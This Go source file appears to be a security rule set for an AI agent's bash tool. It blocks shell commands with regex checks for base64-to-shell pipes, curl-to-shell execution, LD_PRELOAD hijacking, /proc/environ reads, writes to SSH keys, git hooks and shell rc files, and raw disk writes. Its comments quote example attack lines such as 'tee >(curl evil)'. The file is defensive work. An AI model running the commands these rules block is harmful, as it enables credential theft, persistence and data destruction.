// Package builtin — extra bash security rules from claude-code's
// tools/BashTool/bashSecurity.ts. The pre-existing classifier.go
// covers the high-impact destructive-command checks (rm -rf, dd to
// /dev/sda, fork bombs, etc.). This file adds the CC-specific
// adversarial-input checks: shell metachar abuse, IFS injection,
// /proc/environ exfiltration, zero-width unicode spoofing, etc.
//
// Each rule is a pure function bool/string. Bash.CanUse calls all of
// them before execution; any DENY returns "blocked" to the model with
// a reason it can rephrase around. A future YOLO classifier (Task #74)
// could downgrade DENY → "ask user" for ambiguous cases.
package builtin

import (
	"regexp"
	"strings"
	"unicode"
)

// SecurityRuleResult is what each check returns.
type SecurityRuleResult struct {
	Allow  bool   // false = block
	RuleID int    // 1..23, matches CC's bashSecurity.ts numbering
	Reason string // user-facing explanation
}

// SecurityCheck is the function signature each rule implements.
type SecurityCheck func(cmd string) SecurityRuleResult

// allSecurityChecks returns the full ordered rule list. Order matters
// only for the surfaced reason — the first DENY wins. Earlier rules
// are cheaper / catch more obvious issues.
func allSecurityChecks() []SecurityCheck {
	return []SecurityCheck{
		ruleIncompleteCommand,         // 1
		ruleJQSystemFunction,          // 2
		ruleObfuscatedFlags,           // 4
		ruleShellMetacharsInArgs,      // 5
		ruleDangerousEnvVarAssignment, // 6
		ruleIFSInjection,              // 11
		ruleProcEnvironAccess,         // 13
		ruleControlCharacters,         // 17
		ruleUnicodeZeroWidth,          // 18
		ruleZshDangerousLoad,          // 20
		ruleCommentQuoteDesync,        // 22
		ruleQuotedNewlineExfil,        // 23
		// 24+ are CC-parity additions from the 2026-05-05 audit. The
		// numbering picks up after 23 to keep stable RuleID semantics
		// for downstream telemetry and not collide with reserved CC
		// IDs (3, 7, 8, 9, 10, 12, 14, 15, 16, 19, 21).
		ruleUNCPath,             // 24 — \\server\share Windows SMB exfil
		ruleVCSInternalWrite,    // 25 — .git/config / .git/hooks/
		ruleProcessSubstitution, // 26 — <(...) >(...)
		ruleSSHKeyPath,          // 27 — .ssh/, authorized_keys, id_rsa
		ruleShellRCWrite,        // 28 — ~/.bashrc / ~/.zshrc / ~/.profile redirect
		ruleDeviceFileWrite,     // 29 — > /dev/sda, > /dev/null is fine, but > /dev/sda is not
		ruleRemoteExecPipe,      // 30 — curl URL | sh / bash <(curl ...)
	}
}

// CheckCommand runs every rule. Returns the first DENY result, or an
// allow if everything passes. Caller (Bash.CanUse) maps the result to
// tools.PermissionDeny.
func CheckCommand(cmd string) SecurityRuleResult {
	for _, check := range allSecurityChecks() {
		r := check(cmd)
		if !r.Allow {
			return r
		}
	}
	return SecurityRuleResult{Allow: true}
}

// --- individual rules ------------------------------------------------------

// 1: INCOMPLETE_COMMANDS — trailing pipe / && / || or unbalanced quote
// indicates the model is mid-thought; running risks executing whatever
// the shell guesses. Better to bounce back and let it complete.
func ruleIncompleteCommand(cmd string) SecurityRuleResult {
	t := strings.TrimSpace(cmd)
	if t == "" {
		return SecurityRuleResult{Allow: true}
	}
	bad := []string{"|", "&&", "||", "&"}
	for _, suf := range bad {
		if strings.HasSuffix(t, suf) {
			return SecurityRuleResult{RuleID: 1, Reason: "command appears incomplete (trailing " + suf + ")"}
		}
	}
	// Unbalanced quote count.
	if oddCount(t, '\'') || oddCount(t, '"') {
		return SecurityRuleResult{RuleID: 1, Reason: "command has unbalanced quotes"}
	}
	return SecurityRuleResult{Allow: true}
}

// 2: JQ_SYSTEM_FUNCTION — jq's `system(...)` filter executes arbitrary
// shell. A model output blob fed through jq is a classic exfil vector.
func ruleJQSystemFunction(cmd string) SecurityRuleResult {
	if !strings.Contains(cmd, "jq") {
		return SecurityRuleResult{Allow: true}
	}
	// Loose match — `system(` anywhere after a jq invocation. Pipes
	// inside the jq filter (e.g. `'.foo | system("id")'`) are
	// expected, so we don't restrict the in-between chars.
	re := regexp.MustCompile(`(?i)\bjq\b.*\bsystem\s*\(`)
	if re.MatchString(cmd) {
		return SecurityRuleResult{RuleID: 2, Reason: "jq system() function executes arbitrary shell — denied"}
	}
	return SecurityRuleResult{Allow: true}
}

// 4: OBFUSCATED_FLAGS — flag values that look encoded / hex / base64.
// Legit calls don't need `--header=$(echo dGVzdA== | base64 -d)`.
func ruleObfuscatedFlags(cmd string) SecurityRuleResult {
	// $(...) inside flag values is the pattern — model may try to
	// hide an exec via command substitution.
	re := regexp.MustCompile(`-{1,2}[a-zA-Z][\w-]*=\$\(`)
	if re.MatchString(cmd) {
		return SecurityRuleResult{RuleID: 4, Reason: "flag value contains command substitution — possible obfuscation"}
	}
	// Base64-decode-then-pipe-to-bash pattern.
	if regexp.MustCompile(`base64\s+(-d|--decode)[^|]*\|\s*(bash|sh|zsh|ksh)`).MatchString(cmd) {
		return SecurityRuleResult{RuleID: 4, Reason: "base64-decoded payload piped to shell — denied"}
	}
	return SecurityRuleResult{Allow: true}
}

// 5: SHELL_METACHARACTERS — backticks (legacy command sub), nested
// $(...), or excessive metachar density in what looks like an argument
// position. We allow normal pipe chains; we block obvious chains-of-
// chains hiding payloads.
func ruleShellMetacharsInArgs(cmd string) SecurityRuleResult {
	// Backticks for command substitution. Modern scripts use $(...).
	// Backticks in here-docs are fine; bare backticks in commands are
	// usually adversarial.
	if strings.Contains(cmd, "`") && !strings.Contains(cmd, "<<") {
		// Allow if backtick is ONLY inside single quotes (literal).
		if !backtickOnlyInSingleQuotes(cmd) {
			return SecurityRuleResult{RuleID: 5, Reason: "legacy backtick command substitution — use $(...) explicitly"}
		}
	}
	return SecurityRuleResult{Allow: true}
}

// 6: DANGEROUS_VARIABLES — assigning to PATH, LD_PRELOAD, LD_LIBRARY_PATH,
// PYTHONPATH inline before a command is a classic privilege/code-injection.
func ruleDangerousEnvVarAssignment(cmd string) SecurityRuleResult {
	// Match `VAR=value cmd` where VAR is in the danger list.
	dangerous := []string{
		"LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES", "DYLD_LIBRARY_PATH",
		"PYTHONPATH", "PERL5LIB", "RUBYOPT", "NODE_OPTIONS",
	}
	for _, v := range dangerous {
		re := regexp.MustCompile(`(^|[\s;&|])` + v + `=`)
		if re.MatchString(cmd) {
			return SecurityRuleResult{RuleID: 6, Reason: "inline assignment to " + v + " can hijack execution — denied"}
		}
	}
	return SecurityRuleResult{Allow: true}
}

// 11: IFS_INJECTION — `IFS=` + a separator the script then uses to split
// untrusted input. Blocking it broadly is correct for an agent context.
func ruleIFSInjection(cmd string) SecurityRuleResult {
	if regexp.MustCompile(`(^|[\s;&|])IFS\s*=`).MatchString(cmd) {
		return SecurityRuleResult{RuleID: 11, Reason: "IFS reassignment is a known shell-injection vector — denied"}
	}
	return SecurityRuleResult{Allow: true}
}

// 13: PROC_ENVIRON_ACCESS — reading /proc/<pid>/environ leaks env vars
// (often containing API keys). No legitimate agent task needs this.
func ruleProcEnvironAccess(cmd string) SecurityRuleResult {
	// /proc/self/environ or /proc/<n>/environ.
	re := regexp.MustCompile(`/proc/(self|\d+)/environ\b`)
	if re.MatchString(cmd) {
		return SecurityRuleResult{RuleID: 13, Reason: "/proc/.../environ access leaks credentials — denied"}
	}
	return SecurityRuleResult{Allow: true}
}

// 17: CONTROL_CHARACTERS — ASCII 0x00..0x1F (except \t \n \r) hidden in
// the command. Adversarial input embeds these to spoof what a user sees
// vs what the shell actually executes.
func ruleControlCharacters(cmd string) SecurityRuleResult {
	for _, r := range cmd {
		if r < 0x20 && r != '\t' && r != '\n' && r != '\r' {
			return SecurityRuleResult{RuleID: 17, Reason: "command contains control characters (possible spoofing)"}
		}
	}
	return SecurityRuleResult{Allow: true}
}

// 18: UNICODE_WHITESPACE — zero-width chars (U+200B, U+200C, U+200D,
// U+FEFF) and other invisible whitespace. Used to hide payloads inside
// what visually looks like a benign command.
func ruleUnicodeZeroWidth(cmd string) SecurityRuleResult {
	for _, r := range cmd {
		switch r {
		case '\u200B', '\u200C', '\u200D', '\u200E', '\u200F', '\u2060', '\uFEFF':
			return SecurityRuleResult{RuleID: 18, Reason: "command contains zero-width unicode (visual spoofing)"}
		}
		// Other "format" or "control" category runes that aren't ASCII.
		if r > 0x7F && unicode.Is(unicode.Cf, r) {
			return SecurityRuleResult{RuleID: 18, Reason: "command contains unicode format characters"}
		}
	}
	return SecurityRuleResult{Allow: true}
}

// 20: ZSH_DANGEROUS_COMMANDS — zmodload loads native shared objects
// into the shell process, equivalent to LD_PRELOAD for zsh. Always deny.
func ruleZshDangerousLoad(cmd string) SecurityRuleResult {
	dangerous := []string{"zmodload ", "autoload -X", "compaudit"}
	for _, p := range dangerous {
		if strings.Contains(cmd, p) {
			return SecurityRuleResult{RuleID: 20, Reason: "zsh-specific dangerous primitive: " + strings.TrimSpace(p)}
		}
	}
	return SecurityRuleResult{Allow: true}
}

// 22: COMMENT_QUOTE_DESYNC — `# inside an open quote isn't a comment.
// A model output that looks like `cmd "arg # safe-looking comment"`
// actually executes the "comment" as part of the string. This rule
// catches the most obvious case: a quoted region containing `#` that
// looks like it should be a comment.
func ruleCommentQuoteDesync(cmd string) SecurityRuleResult {
	// Walk char by char tracking whether we're inside single/double
	// quotes. Flag if we see ` # ` inside a quote that the user
	// likely thinks is a comment.
	inSingle, inDouble := false, false
	for i, r := range cmd {
		switch r {
		case '\'':
			if !inDouble {
				inSingle = !inSingle
			}
		case '"':
			if !inSingle {
				inDouble = !inDouble
			}
		case '#':
			if (inSingle || inDouble) && i > 0 && cmd[i-1] == ' ' {
				return SecurityRuleResult{RuleID: 22, Reason: "`#` inside a quoted region is NOT a comment — possible desync"}
			}
		}
	}
	return SecurityRuleResult{Allow: true}
}

// 23: QUOTED_NEWLINE — newlines inside an unclosed quote let the model
// smuggle multi-line payloads past a single-line input field. Bash
// happily executes them, but the user prompt UI typically only shows
// the first line.
//
// Heredoc carve-out (2026-05-20): commands containing a `<<DELIM` or
// `<<-DELIM` (optionally quoted: `<<'EOF'` / `<<"EOF"`) heredoc start
// declare their multi-line content explicitly — that's the OPPOSITE
// of "smuggling past a single-line UI". Bash itself recognises the
// region as opaque payload, not subject to quote re-parsing, so any
// `'` or `"` inside doesn't toggle real quote state. The pre-fix
// scanner didn't know that and false-positive denied legitimate
// `cat <<EOF { "key": "val" } EOF` patterns across iter9/10/11.
// Detect the heredoc start and short-circuit Allow; other rules
// (RemoteExecPipe, DangerousVariables, etc.) still run earlier in
// allSecurityChecks and would catch real attacks dressed up in
// heredoc wrapper.
func ruleQuotedNewlineExfil(cmd string) SecurityRuleResult {
	if !strings.Contains(cmd, "\n") {
		return SecurityRuleResult{Allow: true}
	}
	if hereDocStartRe.MatchString(cmd) {
		return SecurityRuleResult{Allow: true}
	}
	inSingle, inDouble := false, false
	for _, r := range cmd {
		switch r {
		case '\'':
			if !inDouble {
				inSingle = !inSingle
			}
		case '"':
			if !inSingle {
				inDouble = !inDouble
			}
		case '\n':
			if inSingle || inDouble {
				return SecurityRuleResult{RuleID: 23, Reason: "newline inside an unclosed quoted region — multi-line smuggling"}
			}
		}
	}
	return SecurityRuleResult{Allow: true}
}

// hereDocStartRe matches a bash heredoc start token:
//   `<<EOF`           — basic
//   `<<-EOF`          — leading-tab strip variant
//   `<<'EOF'` / `<<"EOF"` — quoted delimiter (no parameter expansion)
//   `<<MARKER123_x`   — any identifier delimiter
// The DELIM token is `[A-Za-z_][A-Za-z0-9_]*`. We don't try to find
// the closing delimiter (that would require multi-line scanning); the
// mere presence of `<<DELIM` is enough to declare "this command has
// an explicit multi-line content region, the quote-newline check
// doesn't apply".
var hereDocStartRe = regexp.MustCompile(`<<-?\s*['"]?[A-Za-z_][A-Za-z0-9_]*['"]?`)

// 24: UNC_PATH — Windows UNC paths (\\server\share, \\?\, \\.\) are
// SMB exfil vectors; an LLM convinced to "back up to network share"
// could hand the corpus to attacker-controlled hosts. Mirrors
// claude-code pathValidation.ts:382-391.
func ruleUNCPath(cmd string) SecurityRuleResult {
	if strings.Contains(cmd, `\\`) {
		// Allow escaped backslashes inside otherwise-fine strings only
		// when both members are inside a single-quoted string. Cheaper
		// to just reject unconditionally — UNC has no other use in a
		// shell command from an LLM.
		re := regexp.MustCompile(`\\\\[^\\\s'"]+\\[^\s'"]+`)
		if re.MatchString(cmd) {
			return SecurityRuleResult{RuleID: 24, Reason: "UNC path detected — refusing SMB-share access"}
		}
	}
	return SecurityRuleResult{Allow: true}
}

// 25: VCS_INTERNAL_WRITE — writing to .git/config, .git/hooks/, or
// .git/objects can install hooks that fire on every git operation,
// or rewrite history. claude-code filesystem.ts:225-242.
func ruleVCSInternalWrite(cmd string) SecurityRuleResult {
	// Only flag when the command involves writing — `cat .git/config` is
	// fine. We look for redirect, install, mv, cp INTO a .git path.
	dangerous := []string{
		".git/config", ".git/hooks/", ".git/hooks ", ".git/objects/",
		".git/HEAD", ".git/refs/",
	}
	hasWrite := strings.Contains(cmd, ">") || strings.Contains(cmd, ">>") ||
		regexp.MustCompile(`\b(mv|cp|install|tee|sed\s+-i|rm)\b`).MatchString(cmd) ||
		regexp.MustCompile(`\becho\b.*>.*\.git/`).MatchString(cmd)
	if !hasWrite {
		return SecurityRuleResult{Allow: true}
	}
	for _, p := range dangerous {
		if strings.Contains(cmd, p) {
			return SecurityRuleResult{RuleID: 25, Reason: "write to VCS internal (" + p + ") — install/rewrite hooks vector"}
		}
	}
	return SecurityRuleResult{Allow: true}
}

// 26: PROCESS_SUBSTITUTION — <(...) and >(...) inject filehandles whose
// contents the model can manipulate; `tee >(curl evil)` exfils stdin
// while looking innocuous. Already partially in rule 5 (backticks /
// $()) but bash-specific operators have their own handling.
func ruleProcessSubstitution(cmd string) SecurityRuleResult {
	// Allow inside single quotes (rare in real shell scripts but valid).
	if regexp.MustCompile(`<\(`).MatchString(cmd) {
		return SecurityRuleResult{RuleID: 26, Reason: "process substitution <(...) is an arbitrary-code vector"}
	}
	if regexp.MustCompile(`>\(`).MatchString(cmd) {
		return SecurityRuleResult{RuleID: 26, Reason: "process substitution >(...) can exfiltrate via fd redirection"}
	}
	return SecurityRuleResult{Allow: true}
}

// 27: SSH_KEY_PATH — touching ~/.ssh/* or authorized_keys is high-
// value to an attacker. Defence in depth: the gate's safetyCheck
// already prompts for these paths; this rule blocks WRITES outright
// even in mode=Bypass since SSH key tampering is rarely legitimate
// from an LLM context.
func ruleSSHKeyPath(cmd string) SecurityRuleResult {
	hasWrite := strings.Contains(cmd, ">") || strings.Contains(cmd, ">>") ||
		regexp.MustCompile(`\b(mv|cp|tee|install|rm|chmod|chown)\b`).MatchString(cmd) ||
		regexp.MustCompile(`\becho\b.*\.ssh/`).MatchString(cmd) ||
		regexp.MustCompile(`>\s*[~$]`).MatchString(cmd)
	if !hasWrite {
		return SecurityRuleResult{Allow: true}
	}
	patterns := []string{".ssh/authorized_keys", ".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa", ".ssh/known_hosts", ".ssh/config"}
	for _, p := range patterns {
		if strings.Contains(cmd, p) {
			return SecurityRuleResult{RuleID: 27, Reason: "write to SSH material (" + p + ") — key theft / lateral-movement vector"}
		}
	}
	return SecurityRuleResult{Allow: true}
}

// 28: SHELL_RC_WRITE — writing to ~/.bashrc, ~/.zshrc, etc. installs
// commands that run on every new shell session — classic persistence
// + remote-shell vector. claude-code bashSecurity.ts:664-677.
func ruleShellRCWrite(cmd string) SecurityRuleResult {
	hasWrite := strings.Contains(cmd, ">") || strings.Contains(cmd, ">>") ||
		regexp.MustCompile(`\b(mv|cp|tee|install|sed\s+-i)\b`).MatchString(cmd)
	if !hasWrite {
		return SecurityRuleResult{Allow: true}
	}
	// Match both ~/.bashrc and explicit /Users/xxx/.bashrc forms.
	re := regexp.MustCompile(`(?i)(\.bashrc|\.bash_profile|\.zshrc|\.zprofile|\.zshenv|\.profile|\.bash_logout)\b`)
	if re.MatchString(cmd) {
		return SecurityRuleResult{RuleID: 28, Reason: "write to shell rc file — persistent execution vector"}
	}
	return SecurityRuleResult{Allow: true}
}

// 29: DEVICE_FILE_WRITE — `> /dev/sda` and `dd of=/dev/sda` are
// unrecoverable disk wipes. `> /dev/null` is fine and common, so we
// explicitly allow that special case while denying all other /dev
// writes. Also covers dd's of= argv form.
//
// 2026-05-19 fix: \S+ used to greedily capture trailing shell
// punctuation, so `> /dev/null;` extracted "null;" — which doesn't
// match the `dev == "null"` allowlist case and false-positive denied
// the wholly common `cmd > /dev/null;`. The strippable trailers are
// shell terminators / operators that always end a redirect target:
// `; & | ) > <` (and CRLF, which can land in here via heredocs).
func ruleDeviceFileWrite(cmd string) SecurityRuleResult {
	// Pattern A: `>` or `>>` redirect to /dev/<thing>.
	// Pattern B: dd-style of=/dev/<thing>.
	//
	// The capture group stops at whitespace OR shell separators
	// (; & | ) < >). The earlier `\S+` was too greedy: it ate
	// `null;` in `cmd > /dev/null;` and `null|grep` in
	// `cmd 2>/dev/null|grep` — both false-positive denied. The
	// stricter charclass below was added 2026-05-19 after the
	// bench-iter6 deepseek run surfaced the bug via the new
	// deny-reason logging.
	reRedirect := regexp.MustCompile(`>\s*/dev/([^\s;|&)<>]+)`)
	reOfArg := regexp.MustCompile(`\bof=/dev/([^\s;|&)<>]+)`)

	allMatches := append([][]string(nil), reRedirect.FindAllStringSubmatch(cmd, -1)...)
	allMatches = append(allMatches, reOfArg.FindAllStringSubmatch(cmd, -1)...)

	for _, m := range allMatches {
		dev := m[1]
		// Allow the well-known sinkholes.
		switch {
		case dev == "null", dev == "stderr", dev == "stdout", dev == "stdin",
			strings.HasPrefix(dev, "fd/"),
			strings.HasPrefix(dev, "tty"),
			strings.HasPrefix(dev, "pts/"):
			continue
		}
		return SecurityRuleResult{RuleID: 29, Reason: "write to device file /dev/" + dev + " — destructive / hardware-level"}
	}
	return SecurityRuleResult{Allow: true}
}

// 30: REMOTE_EXEC_PIPE — `curl URL | sh`, `wget -O- URL | bash`, and
// `bash <(curl URL)` are classic LotL execution vectors. The model
// trusting an upstream URL doesn't make the bytes safe — the URL
// owner can swap payloads at any time.
func ruleRemoteExecPipe(cmd string) SecurityRuleResult {
	// Pattern 1: curl|wget piped into a shell.
	re1 := regexp.MustCompile(`\b(curl|wget|fetch|http)\b[^|;&]*\|\s*(sh|bash|zsh|ksh|dash|python|python3|node|perl|ruby)\b`)
	if re1.MatchString(cmd) {
		return SecurityRuleResult{RuleID: 30, Reason: "remote-fetch piped to interpreter — arbitrary-code-from-URL vector"}
	}
	// Pattern 2: bash/sh consuming a process-substituted curl.
	// (Process substitution itself is rule 26, but interpreted shells
	//  with explicit -c reading curl output deserve their own reason.)
	re2 := regexp.MustCompile(`\b(sh|bash|zsh|python|node)\s+-c\s+["'].*\b(curl|wget)\b`)
	if re2.MatchString(cmd) {
		return SecurityRuleResult{RuleID: 30, Reason: "interpreter -c invoking remote-fetch — same risk as curl|sh"}
	}
	return SecurityRuleResult{Allow: true}
}

// --- helpers ---------------------------------------------------------------

func oddCount(s string, c rune) bool {
	n := 0
	for _, r := range s {
		if r == c {
			n++
		}
	}
	return n%2 == 1
}

func backtickOnlyInSingleQuotes(s string) bool {
	inSingle := false
	for _, r := range s {
		if r == '\'' {
			inSingle = !inSingle
		}
		if r == '`' && !inSingle {
			return false
		}
	}
	return true
}
